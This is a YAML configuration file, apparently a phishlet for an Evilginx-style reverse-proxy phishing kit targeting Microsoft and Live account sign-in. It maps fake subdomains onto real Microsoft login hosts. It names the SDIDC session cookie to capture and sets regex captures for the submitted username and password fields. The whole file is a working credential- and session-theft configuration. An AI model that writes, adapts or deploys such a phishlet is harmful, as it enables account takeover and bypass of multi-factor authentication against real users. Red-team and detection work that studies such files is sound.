min_ver: '3.0.0'

author: 'cjr'

proxy_hosts:
  - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}

  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'wwe', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
 # - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}

auth_tokens:
  - domain: '.login.live.com'
    keys: ['SDIDC']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'
